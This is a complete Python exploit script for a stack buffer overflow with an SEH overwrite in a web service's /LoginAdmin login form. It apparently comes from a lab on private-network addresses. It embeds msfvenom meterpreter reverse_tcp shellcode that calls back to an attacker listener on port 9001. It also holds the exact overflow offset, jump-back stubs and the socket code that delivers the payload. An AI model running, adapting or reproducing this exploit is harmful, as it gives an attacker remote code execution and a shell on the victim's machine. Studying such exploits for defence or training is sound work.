import socket, os, sys
from struct import pack

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.61.146 LPORT=9001 -b "\x00\x26\x2f\x3d\x3f\x5c" -f python -v buf EXITFUNC=thread
buf =  "\x90" * 50    # additional padding before shellcode
buf += "\xdb\xd2\xbb\x9a\xd5\x8d\xbe\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x5b\x31\x5a\x19\x83\xea\xfc\x03\x5a\x15\x78"
buf += "\x20\x71\x56\xfe\xcb\x8a\xa7\x9e\x42\x6f\x96\x9e\x31"
buf += "\xfb\x89\x2e\x31\xa9\x25\xc5\x17\x5a\xbd\xab\xbf\x6d"
buf += "\x76\x01\xe6\x40\x87\x39\xda\xc3\x0b\x43\x0f\x24\x35"
buf += "\x8c\x42\x25\x72\xf0\xaf\x77\x2b\x7f\x1d\x68\x58\x35"
buf += "\x9e\x03\x12\xd8\xa6\xf0\xe3\xdb\x87\xa6\x78\x82\x07"
buf += "\x48\xac\xbf\x01\x52\xb1\x85\xd8\xe9\x01\x72\xdb\x3b"
buf += "\x58\x7b\x70\x02\x54\x8e\x88\x42\x53\x70\xff\xba\xa7"
buf += "\x0d\xf8\x78\xd5\xc9\x8d\x9a\x7d\x9a\x36\x47\x7f\x4f"
buf += "\xa0\x0c\x73\x24\xa6\x4b\x90\xbb\x6b\xe0\xac\x30\x8a"
buf += "\x27\x25\x02\xa9\xe3\x6d\xd1\xd0\xb2\xcb\xb4\xed\xa5"
buf += "\xb3\x69\x48\xad\x5e\x7e\xe1\xec\x36\xb3\xc8\x0e\xc7"
buf += "\xdb\x5b\x7c\xf5\x44\xf0\xea\xb5\x0d\xde\xed\xcc\x19"
buf += "\xe1\x22\x76\x49\x1f\xc3\x87\x40\xe4\x97\xd7\xfa\xcd"
buf += "\x97\xb3\xfa\xf2\x4d\x29\xf0\x64\xae\x06\x39\xe7\x46"
buf += "\x55\x41\x24\xbe\xd0\xa7\x7a\x90\xb2\x77\x3b\x40\x73"
buf += "\x27\xd3\x8a\x7c\x18\xc3\xb4\x56\x31\x6e\x5b\x0f\x6a"
buf += "\x07\xc2\x0a\xe0\xb6\x0b\x81\x8d\xf9\x80\x20\x72\xb7"
buf += "\x60\x40\x60\xa0\x16\xaa\x78\x31\xb3\xaa\x12\x35\x15"
buf += "\xfc\x8a\x37\x40\xca\x15\xc7\xa7\x48\x51\x37\x36\x79"
buf += "\x2a\x0e\xac\xc5\x44\x6f\x20\xc6\x94\x39\x2a\xc6\xfc"
buf += "\x9d\x0e\x95\x19\xe2\x9a\x89\xb2\x77\x25\xf8\x67\xdf"
buf += "\x4d\x06\x5e\x17\xd2\xf9\xb5\x2b\x15\x05\x48\x04\xbe"
buf += "\x6e\xb2\x14\x3e\x6f\xd8\x94\x6e\x07\x17\xba\x81\xe7"
buf += "\xd8\x11\xca\x6f\x53\xf4\xb8\x0e\x64\xdd\x1d\x8f\x65"
buf += "\xd2\x85\x20\x1c\x9b\x3a\xc1\xe1\xb5\x5e\xc1\xe2\xb9"
buf += "\x60\xfd\x35\x80\x16\xc0\x86\xb7\x39\xdf\x22\xc2\xd1"
buf += "\x46\xa7\x6f\xbc\x78\x12\xb3\xb9\xfa\x96\x4c\x3e\xe2"
buf += "\xd3\x49\x7a\xa4\x08\x20\x13\x41\x2e\x97\x14\x40"

jumpCall = "\xEB\x09"
jumpBackwards = "\x59\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1\xE8\xF2\xFF\xFF\xFF"  # large jump
nseh = "\xEB\xD0\x90\x90"
seh = pack("<L", 0x00475ea6)

crash = "A" * (2776 - len(jumpCall) - len(jumpBackwards) - len(buf) - 50)   # getting the exact buffer size 
crash += buf
crash += "\x90" * 50
crash += jumpCall
crash += jumpBackwards
crash += nseh
crash += seh

buffer = ""
buffer += "POST /LoginAdmin HTTP/1.1\r\n"
buffer += "Host: 192.168.61.145:18881\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Accept-Encoding: gzip, deflate\r\n"
buffer += "Referer: http://192.168.61.145:18881/\r\n"
buffer += "Connection: close\r\n"
buffer += "Upgrade-Insecure-Requests: 1\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: 78\r\n\r\n"
buffer += "Password=asdf&Redirect=%23%23%23REDIRECT%23%23%23&NoJs=" + crash + "&LoginButtonName=Login\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.61.145', 18881))
s.send(buffer)
s.close()
